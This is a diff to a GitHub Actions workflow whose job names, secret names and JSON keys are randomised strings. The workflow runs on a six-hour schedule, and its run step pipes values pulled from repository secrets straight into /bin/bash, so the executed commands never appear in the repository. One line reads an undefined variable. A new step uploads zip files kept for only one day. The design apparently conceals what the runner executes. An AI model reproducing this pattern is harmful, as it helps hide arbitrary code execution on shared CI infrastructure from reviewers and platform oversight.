@@ -1,8 +1,9 @@
 name: dartrest39
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '4 5/6 * * *'
+    - cron: '22 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: dartrest39
         env:
-          g458: ${{ secrets.g458 }}
+          kxha7: ${{ secrets.kxha7 }}
         run: |
-          echo $g458 | jq -r .yjlq9571 | /bin/bash
-          echo $f53288 | jq -r .lzzi05 | /bin/bash
-          echo $x67685 | jq -r .r95 | /bin/bash
-          echo $rrbo5 | jq -r .qruea486 | /bin/bash
-          echo $dbem286 | jq -r .cq6884 | /bin/bash
+          printf '%s' "$kxha7" | jq -r .jtma27840 | /bin/bash
+          echo $qox34241 | jq -r .sq3 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: j4XVDkKq
+          path: "*.zip"
+          retention-days: 1
